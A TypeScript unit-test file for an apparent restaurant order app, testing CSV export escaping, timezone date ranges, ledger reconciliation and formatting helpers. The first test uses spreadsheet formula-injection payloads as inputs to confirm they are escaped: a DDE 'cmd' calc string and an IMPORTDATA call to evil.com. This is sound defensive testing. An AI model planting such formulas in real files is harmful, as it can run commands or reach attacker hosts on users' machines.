import { test } from 'node:test';
import assert from 'node:assert/strict';
import { csvCell, toCsv, formatOrdersToCsv, type ExportOrderRecord } from '../../src/domain/csv';
import { rangeFor, tzOffsetMs, localMidnight } from '../../src/domain/dates';
import {
  reconcileReportWithLedgers,
  getReportCacheKey,
  formatMinutesHuman,
  type DashboardSummary,
} from '../../src/domain/reports';

test('csvCell: blocks formula injection characters (=, +, -, @, \\t, \\r) by prepending a quote', () => {
  // Dangerous spreadsheet formula attempts
  assert.equal(csvCell('=cmd|\' /C calc\'!A0'), '\'=cmd|\' /C calc\'!A0');
  assert.equal(csvCell('=SUM(A1:B10)'), '\'=SUM(A1:B10)');
  assert.equal(csvCell('+12345'), '\'+12345');
  assert.equal(csvCell('-99.50'), '\'-99.50');
  assert.equal(csvCell('@SUM(A1:B10)'), '\'@SUM(A1:B10)');
  assert.equal(csvCell('@IMPORTDATA("https://evil.com")'), '"\'@IMPORTDATA(""https://evil.com"")"');
  assert.equal(csvCell('\tTAB_PREFIX'), '\'\tTAB_PREFIX');
  assert.equal(csvCell('\rCR_PREFIX'), '"\'\rCR_PREFIX"');

  // Normal strings and numbers remain unmodified
  assert.equal(csvCell('Coffee'), 'Coffee');
  assert.equal(csvCell('123.45'), '123.45');
  assert.equal(csvCell(0), '0');
  assert.equal(csvCell(null), '');
  assert.equal(csvCell(undefined), '');
});

test('csvCell & toCsv: escapes commas, newlines, and quotes according to RFC 4180', () => {
  assert.equal(csvCell('Bole, Addis Ababa'), '"Bole, Addis Ababa"');
  assert.equal(csvCell('Special "Tibs"'), '"Special ""Tibs"""');
  assert.equal(csvCell('Line 1\nLine 2'), '"Line 1\nLine 2"');

  const rows = [
    ['Code', 'Customer', 'Total'],
    ['#001', 'Abebe, Bikila', 150],
    ['#002', '=SUM(A1)', 200],
  ];

  const csv = toCsv(rows);
  assert.equal(
    csv,
    'Code,Customer,Total\r\n#001,"Abebe, Bikila",150\r\n#002,\'=SUM(A1),200\r\n'
  );
});

test('formatOrdersToCsv: generates formula-safe header and rows for export', () => {
  const sampleOrders: ExportOrderRecord[] = [
    {
      order_code: '#OD-101',
      order_date: '2026-11-21',
      type: 'delivery',
      status: 'completed',
      channel: 'phone',
      total: 450.5,
      paid_amount: 450.5,
      balance: 0,
      items_count: 2,
      created_at: '2026-11-21T08:30:00.000Z',
      due_at: '2026-11-21T09:15:00.000Z',
      completed_at: '2026-11-21T09:10:00.000Z',
    },
    {
      order_code: '+INJ-002',
      order_date: '2026-11-21',
      type: 'dine_in',
      status: 'new',
      channel: 'walk_in',
      total: 100,
      paid_amount: 0,
      balance: 100,
      items_count: 1,
      created_at: '2026-11-21T09:00:00.000Z',
    },
  ];

  const csv = formatOrdersToCsv(sampleOrders);
  // Header exists
  assert.ok(csv.includes('Order Code,Date,Type,Status,Channel,Items Count,Total (ETB),Paid (ETB),Balance (ETB)'));
  // Normal order row
  assert.ok(csv.includes('#OD-101,2026-11-21,delivery,completed,phone,2,450.50,450.50,0.00'));
  // Injection order code escaped
  assert.ok(csv.includes('\'+INJ-002,2026-11-21,dine_in,new,walk_in,1,100.00,0.00,100.00'));
});

test('rangeFor: computes timezone-aware boundaries for today, week, and month without external libraries', () => {
  const tz = 'Africa/Addis_Ababa';
  // Fixed timestamp: Saturday Nov 21 2026 12:00:00 UTC (15:00:00 in Addis Ababa)
  const fixedInstant = Date.parse('2026-11-21T12:00:00Z');

  // 1. Today range
  const todayRange = rangeFor('today', tz, fixedInstant);
  assert.ok(new Date(todayRange.from) < new Date(todayRange.to));
  // Today starts at 00:00 Addis time = 21:00 UTC previous day (UTC+3 offset)
  assert.equal(new Date(todayRange.from).toISOString(), '2026-11-20T21:00:00.000Z');
  assert.equal(new Date(todayRange.to).toISOString(), '2026-11-21T21:00:00.000Z');

  // 2. Week range (starts Monday)
  const weekRange = rangeFor('week', tz, fixedInstant);
  assert.ok(new Date(weekRange.from) < new Date(weekRange.to));
  // Monday Nov 16 2026 00:00 Addis = Nov 15 21:00 UTC
  assert.equal(new Date(weekRange.from).toISOString(), '2026-11-15T21:00:00.000Z');
  // Next Monday Nov 23 2026 00:00 Addis = Nov 22 21:00 UTC
  assert.equal(new Date(weekRange.to).toISOString(), '2026-11-22T21:00:00.000Z');

  // 3. Month range (starts 1st)
  const monthRange = rangeFor('month', tz, fixedInstant);
  assert.ok(new Date(monthRange.from) < new Date(monthRange.to));
  // Nov 1 2026 00:00 Addis = Oct 31 21:00 UTC
  assert.equal(new Date(monthRange.from).toISOString(), '2026-10-31T21:00:00.000Z');
  // Dec 1 2026 00:00 Addis = Nov 30 21:00 UTC
  assert.equal(new Date(monthRange.to).toISOString(), '2026-11-30T21:00:00.000Z');
});

test('reconcileReportWithLedgers: strictly verifies dashboard numbers match immutable ledgers', () => {
  const summary: DashboardSummary = {
    orders_count: 3,
    sales_total: 1200,
    cash_in: 950,
    unpaid_balance: 250,
    late_count: 0,
    avg_completion_minutes: 25,
    by_status: { completed: 2, accepted: 1 },
  };

  const ledgerPayments = [
    { kind: 'payment', amount: 500 },
    { kind: 'deposit', amount: 500 },
    { kind: 'refund', amount: 50 },
  ]; // Net cash in = 500 + 500 - 50 = 950

  const orderMoneyList = [
    { status: 'completed', total: 700, paid_amount: 700 }, // paid in full
    { status: 'completed', total: 500, paid_amount: 300 }, // completed but unpaid 200
    { status: 'accepted', total: 100, paid_amount: 50 },   // active unpaid 50
    { status: 'cancelled', total: 300, paid_amount: 0 },   // cancelled excluded from sales & unpaid
  ]; // Sales = 700 + 500 = 1200. Unpaid = (500 - 300) + (100 - 50) = 250.

  const result = reconcileReportWithLedgers(summary, ledgerPayments, orderMoneyList);
  assert.equal(result.reconciled, true);
  assert.equal(result.computedCashIn, 950);
  assert.equal(result.computedSales, 1200);
  assert.equal(result.computedUnpaid, 250);

  // Mismatch in cash_in throws error
  assert.throws(
    () => {
      reconcileReportWithLedgers(
        { ...summary, cash_in: 900 },
        ledgerPayments,
        orderMoneyList
      );
    },
    /Ledger reconciliation mismatch/
  );
});

test('formatMinutesHuman & getReportCacheKey: formatting utilities', () => {
  assert.equal(formatMinutesHuman(25), '25 min');
  assert.equal(formatMinutesHuman(60), '1h');
  assert.equal(formatMinutesHuman(95), '1h 35m');
  assert.equal(getReportCacheKey('shop-abc', 'today'), 'report_cache_shop-abc_today');
});
